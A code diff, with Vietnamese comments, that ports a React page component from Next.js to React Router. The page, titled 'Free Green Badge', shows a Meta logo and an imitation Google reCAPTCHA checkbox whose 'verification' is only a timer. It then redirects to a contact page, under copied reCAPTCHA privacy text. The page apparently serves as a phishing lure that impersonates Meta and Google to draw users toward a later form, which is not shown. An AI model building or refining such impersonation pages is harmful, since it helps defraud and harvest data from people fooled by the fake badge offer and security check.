@@ -1,68 +1,66 @@
-'use client';
-import CheckMarkImage from '/checkmark.png';
-import MetaImage from '/meta-image.png';
-import ReCaptchaImage from '/recaptcha.png';
-import axios from 'axios';
-import Image from 'next/image';
-import { useRouter } from 'next/navigation';
-import { useEffect, useState, type FC } from 'react';
-const Index: FC = () => {
-    const router = useRouter();
+import { useEffect, useState } from 'react';
+import { useNavigate } from 'react-router-dom'; // Dùng useNavigate của React Router
+
+const Live = () => {
+    // Thay thế useRouter bằng useNavigate
+    const navigate = useNavigate(); 
     const [isLoading, setIsLoading] = useState(false);
-    const [isShowCheckMark, setisShowCheckMark] = useState(false);
+    const [isShowCheckMark, setIsShowCheckMark] = useState(false);
 
-  const handleVerify = () => {
-    setIsLoading(true);
-    // Giả lập API verify
-    setTimeout(() => {
-      setIsShowCheckMark(true);
-      setIsLoading(false);
-    }, 2000);
-  };
+    const handleVerify = () => {
+        setIsLoading(true);
+        // Giả lập API verify
+        setTimeout(() => {
+            setIsShowCheckMark(true);
+            setIsLoading(false);
+        }, 2000);
+    };
 
-  useEffect(() => {
-    if (isShowCheckMark) {
-      const redirectTimeout = setTimeout(() => {
-        const currentTime = Date.now();
-        navigate(`/contact/${currentTime}`);
-      }, 500);
-      return () => clearTimeout(redirectTimeout);
-    }
-  }, [isShowCheckMark, navigate]);
+    useEffect(() => {
+        if (isShowCheckMark) {
+            const redirectTimeout = setTimeout(() => {
+                const currentTime = Date.now();
+                navigate(`/contact/${currentTime}`);
+            }, 500);
+            return () => clearTimeout(redirectTimeout);
+        }
+    }, [isShowCheckMark, navigate]);
 
-  return (
+    return (
         <div className='flex flex-col items-center justify-center pt-[150px]'>
             <title>Free Green Badge</title>
             <div className='w-[300px]'>
-                <Image src={MetaImage} alt='' className='w-16' />
+                {/* Thay thế <Image> của Nextjs bằng <img> của HTML chuẩn */}
+                <img src='/meta-image.png' alt='Meta' className='w-16' />
+                
                 <div className='flex w-full items-center justify-start py-5'>
                     <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
                         <div className='flex items-center justify-start'>
                             <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
                                 <button
-                                    className='flex h-full w-full items-center justify-center'
-                                    onClick={() => {
-                                        handleVerify();
-                                    }}
+                                    className='flex h-full w-full items-center justify-center relative'
+                                    onClick={handleVerify}
                                 >
                                     <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                     {isLoading ? (
-                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
+                                        // Đổi animate-spin-fast thành animate-spin nếu Tailwind của bạn chưa config spin-fast
+                                        <div className='h-full w-full animate-spin rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all'></div>
                                     ) : (
                                         <div
-                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
+                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all`}
                                             style={{
-                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
+                                                // Đảm bảo bạn có file checkmark.png trong thư mục public
+                                                backgroundImage: isShowCheckMark ? `url("/checkmark.png")` : '',
                                                 backgroundPosition: '-10px -595px'
                                             }}
                                         ></div>
                                     )}
                                 </button>
                             </div>
-                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
+                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I'm not a robot</div>
                         </div>
                         <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
-                            <Image src={ReCaptchaImage} alt='' className='h-10 w-10' />
+                            <img src='/recaptcha.png' alt='reCAPTCHA' className='h-10 w-10' />
                             <p className='text-[10px] font-bold'>reCAPTCHA</p>
                             <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
                         </div>
@@ -70,9 +68,12 @@ const Index: FC = () => {
                 </div>
                 <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
                     <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
-                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
+                    <p>We’ve used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                     <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                 </div>
             </div>
         </div>
     );
+};
+
+export default Live;
